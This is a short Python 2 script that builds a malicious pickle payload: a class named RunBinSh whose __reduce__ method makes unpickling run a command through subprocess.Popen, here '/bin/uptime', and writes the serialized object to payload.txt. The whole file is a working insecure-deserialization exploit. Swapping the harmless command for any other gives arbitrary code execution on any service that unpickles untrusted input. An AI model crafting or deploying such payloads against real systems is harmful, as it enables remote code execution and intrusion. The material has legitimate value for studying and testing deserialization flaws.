import cPickle
import subprocess

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/uptime',),))

open('payload.txt', 'w').write(cPickle.dumps(RunBinSh()))
